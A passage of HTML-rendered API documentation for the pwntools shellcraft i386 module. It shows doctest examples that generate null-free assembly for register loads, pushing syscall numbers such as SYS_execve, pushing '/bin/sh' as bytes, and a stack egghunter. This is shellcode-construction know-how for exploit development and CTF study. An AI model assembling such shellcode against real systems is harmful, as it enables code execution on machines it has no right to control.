<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;edi&#39;</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push 9 /* mov edi, &#39;\n&#39; */</span>
<span class="go">    pop edi</span>
<span class="go">    inc edi</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;al&#39;</span><span class="p">,</span> <span class="s1">&#39;ax&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* moving ax into al, but this is a no-op */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;al&#39;</span><span class="p">,</span><span class="s1">&#39;ax&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* moving ax into al, but this is a no-op */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* moving esp into esp, but this is a no-op */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;ax&#39;</span><span class="p">,</span> <span class="s1">&#39;bl&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    movzx ax, bl</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push 1</span>
<span class="go">    pop eax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stack_allowed</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov al, 1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mh">0xdead00ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, -0xdead00ff</span>
<span class="go">    neg eax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov al, 0xc0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;edi&#39;</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov edi, -0xc0</span>
<span class="go">    neg edi</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mh">0xc000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov ah, 0xc000 &gt;&gt; 8</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mh">0xffc000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov eax, 0x1010101</span>
<span class="go">    xor eax, 0x1010101 ^ 0xffc000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;edi&#39;</span><span class="p">,</span> <span class="mh">0xc000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov edi, (-1) ^ 0xc000</span>
<span class="go">    not edi</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;edi&#39;</span><span class="p">,</span> <span class="mh">0xf500</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov edi, 0x1010101</span>
<span class="go">    xor edi, 0x1010101 ^ 0xf500</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="mh">0xc0c0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    xor eax, eax</span>
<span class="go">    mov ax, 0xc0c0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push SYS_execve /* 0xb */</span>
<span class="go">    pop eax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push SYS_execve /* 0x3b */</span>
<span class="go">    pop eax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push (PROT_READ | PROT_WRITE | PROT_EXEC) /* 7 */</span>
<span class="go">    pop eax</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.nop">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">nop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/nop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.nop" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte nop instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.prolog">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">prolog</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/prolog.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.prolog" title="Permalink to this definition">¶</a></dt>
<dd><p>Function prologue.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.push">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">push</code><span class="sig-paren">(</span><em>value</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/push.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a value onto the stack without using
null bytes or newline characters.</p>
<p>If src is a string, then we try to evaluate with <cite>context.arch = &#8216;i386&#8217;</cite> using
<code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> before determining how to push it. Note that this
means that this shellcode can change behavior depending on the value of
<cite>context.os</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>value</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The value or register to push</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 0 */</span>
<span class="go">    push 1</span>
<span class="go">    dec byte ptr [esp]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 1 */</span>
<span class="go">    push 1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 0x100 */</span>
<span class="go">    push 0x1010201</span>
<span class="go">    xor dword ptr [esp], 0x1010301</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push SYS_execve (0xb) */</span>
<span class="go">    push 0xb</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_sendfile&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push SYS_sendfile (0xbb) */</span>
<span class="go">    push 0x1010101</span>
<span class="go">    xor dword ptr [esp], 0x10101ba</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push SYS_execve (0x3b) */</span>
<span class="go">    push 0x3b</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.pushstr">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">pushstr</code><span class="sig-paren">(</span><em>string</em>, <em>append_null=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/pushstr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.pushstr" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a string onto the stack without using
null bytes or newline characters.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\x00&#39; */</span>
<span class="go">    push 1</span>
<span class="go">    dec byte ptr [esp]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;a\x00&#39; */</span>
<span class="go">    push 0x61</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aa\x00&#39; */</span>
<span class="go">    push 0x1010101</span>
<span class="go">    xor dword ptr [esp], 0x1016060</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaa\x00&#39; */</span>
<span class="go">    push 0x1010101</span>
<span class="go">    xor dword ptr [esp], 0x1606060</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaa\x00&#39; */</span>
<span class="go">    push 1</span>
<span class="go">    dec byte ptr [esp]</span>
<span class="go">    push 0x61616161</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaaa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaaa\x00&#39; */</span>
<span class="go">    push 0x61</span>
<span class="go">    push 0x61616161</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;</span><span class="p">,</span> <span class="n">append_null</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;aaaa&#39; */</span>
<span class="go">    push 0x61616161</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\xc3\x00&#39; */</span>
<span class="go">    push 0x1010101</span>
<span class="go">    xor dword ptr [esp], 0x10101c2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\xc3</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">append_null</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;\xc3&#39; */</span>
<span class="go">    push -0x3d</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)))</span>
<span class="go">68010101018134242e726901682f62696e</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)))</span>
<span class="go">6a01fe0c24</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)))</span>
<span class="go">6a01fe0c24</span>
</pre></div>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to push.</li>
<li><strong>append_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to append a single NULL-byte before pushing.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.pushstr_array">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">pushstr_array</code><span class="sig-paren">(</span><em>reg</em>, <em>array</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/pushstr_array.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.pushstr_array" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes an array/envp-style array of pointers onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Destination register to hold the pointer.</li>
<li><strong>array</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Single argument or list of arguments to push.
NULL termination is normalized so that each argument
ends with exactly one NULL byte.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.ret">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">ret</code><span class="sig-paren">(</span><em>return_value=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/ret.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.ret" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte RET instruction.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>return_value</strong> &#8211; Value to return</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.setregs">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">setregs</code><span class="sig-paren">(</span><em>reg_context</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/setregs.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.setregs" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets multiple registers, taking any register dependencies into account
(i.e., given eax=1,ebx=eax, set ebx first).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg_context</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Desired register context</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;eax&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;ebx&#39;</span><span class="p">:</span><span class="s1">&#39;eax&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov ebx, eax</span>
<span class="go">    push 1</span>
<span class="go">    pop eax</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;eax&#39;</span><span class="p">:</span><span class="s1">&#39;ebx&#39;</span><span class="p">,</span> <span class="s1">&#39;ebx&#39;</span><span class="p">:</span><span class="s1">&#39;eax&#39;</span><span class="p">,</span> <span class="s1">&#39;ecx&#39;</span><span class="p">:</span><span class="s1">&#39;ebx&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov ecx, ebx</span>
<span class="go">    xchg eax, ebx</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.stackarg">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">stackarg</code><span class="sig-paren">(</span><em>index</em>, <em>register</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/stackarg.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.stackarg" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a stack-based argument into a register.</p>
<p>Assumes that the &#8216;prolog&#8217; code was used to save EBP.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>index</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Zero-based argument index.</li>
<li><strong>register</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Register name.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.stackhunter">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">stackhunter</code><span class="sig-paren">(</span><em>cookie = 0x7afceb58</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/stackhunter.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.stackhunter" title="Permalink to this definition">¶</a></dt>
<dd><blockquote>
<div><p>Returns an an egghunter, which searches from esp and upwards
for a cookie. However to save bytes, it only looks at a single
4-byte alignment. Use the function stackhunter_helper to
generate a suitable cookie prefix for you.</p>
<p>The default cookie has been chosen, because it makes it possible
to shave a single byte, but other cookies can be used too.</p>
</div></blockquote>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">stackhunter</span><span class="p">()))</span>
<span class="go">3d58ebfc7a75faffe4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">():</span>
<span class="gp">... </span>   <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
<span class="gp">... </span>   <span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">stackhunter</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)))</span>
<span class="go">583defbeadde75f8ffe4</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.i386.strcpy">
<code class="descclassname">pwnlib.shellcraft.i386.</code><code class="descname">strcpy</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/i386/strcpy.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.i386.strcpy" title="Permalink to this definition">¶</a></dt>
<dd><p>Copies a string</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="s1">&#39;jmp get_str</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="s1">&#39;pop_str: pop eax</span><span class="se">\n</span><span class="s1">&#39;</span>
